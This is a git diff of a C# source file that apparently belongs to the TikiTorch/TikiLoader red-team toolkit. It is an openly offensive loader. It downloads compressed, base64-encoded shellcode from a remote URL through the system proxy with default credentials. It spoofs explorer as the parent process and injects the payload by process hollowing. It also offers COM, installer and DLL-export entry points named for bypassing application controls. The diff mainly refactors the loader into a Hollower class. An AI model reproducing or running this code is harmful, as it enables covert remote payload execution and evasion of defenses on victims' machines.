@@ -1,10 +1,11 @@
 ﻿using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-using System.EnterpriseServices;
-using RGiesecke.DllExport;
-using System.Windows.Forms;
 using System.Net;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.EnterpriseServices;
+using System.Runtime.InteropServices;
+
+using RGiesecke.DllExport;
 using TikiLoader;
 
 [assembly: ApplicationActivation(ActivationOption.Server)]
@@ -12,14 +13,13 @@ using TikiLoader;
 
 public class TikiThings
 {
-
     private static byte[] GetShellcode(string url)
     {
         WebClient client = new WebClient();
         client.Proxy = WebRequest.GetSystemWebProxy();
         client.Proxy.Credentials = CredentialCache.DefaultCredentials;
         string compressedEncodedShellcode = client.DownloadString(url);
-        return Loader.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));
+        return Generic.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));
     }
 
     private static int FindProcessPid(string process)
@@ -39,7 +39,6 @@ public class TikiThings
         }
 
         return pid;
-
     }
 
     public static void Flame()
@@ -50,22 +49,22 @@ public class TikiThings
         byte[] shellcode = GetShellcode(url);
         int ppid = FindProcessPid("explorer");
 
-        if (ppid == 0)
+        if (ppid != 0)
         {
-            Console.WriteLine("[x] Couldn't get Explorer PID");
+            try
+            {
+                var hollower = new Hollower();
+                hollower.Hollow(binary, shellcode, ppid);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(" [x] {0}", e.Message);
+            }
+        }
+        else
+        {
             Environment.Exit(1);
-        }
-
-        var ldr = new Loader();
-
-        try
-        {
-            ldr.Load(binary, shellcode, ppid);
-        }
-        catch (Exception e)
-        {
-            Console.WriteLine("[x] Something went wrong! " + e.Message);
-        }
+        }        
     }
 
     public static void ExecParam(string a)
@@ -91,7 +90,7 @@ public class TikiThing : System.Configuration.Install.Installer
 [Transaction(TransactionOption.Required)]
 public class Bypass : ServicedComponent
 {
-    public Bypass() { Console.WriteLine("I am a basic COM Object"); }
+    public Bypass() { Console.WriteLine("TikiTorch!"); }
 
     [ComRegisterFunction]
     public static void RegisterClass(string key)
@@ -137,5 +136,4 @@ class Exports
         string b = Marshal.PtrToStringUni(a);
         TikiThings.ExecParam(b);
     }
-
 }
